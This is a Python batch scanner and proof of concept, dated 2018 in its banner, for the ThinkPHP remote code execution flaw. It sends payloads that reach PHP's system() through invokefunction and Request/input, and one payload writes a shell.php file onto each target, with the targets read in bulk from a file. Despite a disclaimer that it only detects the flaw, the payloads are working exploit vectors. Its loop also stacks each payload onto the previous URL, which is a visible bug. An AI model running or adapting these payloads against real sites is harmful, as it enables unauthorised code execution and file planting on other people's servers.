#coding:utf-8

"""

    Author:AdminTony
    Blog: http://www.admintony.com

"""
import requests,sys

payload = {
    0:r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com",
    1:r"?s=index/\think\Request/input&filter=system&data=echo%20www_admintony_com",
    2:r"?s=index/\think\view\driver\Php/display&content=%3C?php%20echo%20www_admintony_com;?%3E",
    3:r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com",
    4:r"?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20echo%20\"www_admintony_com\";?%3E"
}

headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
        'referer':'http://baidu.com'}

def Requests(url):
    res = requests.get(url,headers=headers)
    if 'www_admintony_com' in res.text:
        return True
    else:
        return False

def Requests_write(url,URL):
    # 写shell
    requests.get(url,headers=headers)
    # 验证是否写入成功
    res1 = requests.get(URL+'/shell.php')
    if 'www_admintony_com' in res1.text:
        return True
    else:
        return False

def Scan(url):
    URL = url
    if ('http://' in url) or ('https://' in url):
        pass
    else:
        url = 'http://'+url
        URL = url
    if 'index.php' not in url:
        url = url+'/index.php'
    i = 0
    flag =False
    while i<5:
        url = url+payload.get(i)
        #print(payload.get(i))
        if not flag:
            if i<4:
                flag = Requests(url)
            elif i==4:
                flag = Requests_write(url,URL)
            i = i+1
        else:
            break

    if i==5:
        print("[-] {} is not vulnerable".format(URL))
        print()
    else:
        print("[+] {} is vulnerable\n[+] Payload is {}".format(URL,payload.get(i-1)))
        print()

def Batch(file):

    with open(file,'r+') as f:
        targets = f.readlines()

    #print(targets)

    for t in targets:
        try:
            t = t.split('\n')[0]
        except:
            pass
        print('[+]Testing '+t)
        Scan(t)

def banner():
    print("""thinkPHPBatchPoc
Author: Admintony @ 2018.12.13
Blog: http://www.admintony.com
免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。

usage:
thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞
thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞

    """)

if __name__ == '__main__':

    """
    usage : POC.py -f target.txt
            POC.py -u target_url
    """
    if len(sys.argv)!=3:
        banner()
        exit()

    if sys.argv[1]=='-f':
        Batch(sys.argv[2])
    elif sys.argv[1]=='-u':
        Scan(sys.argv[2])

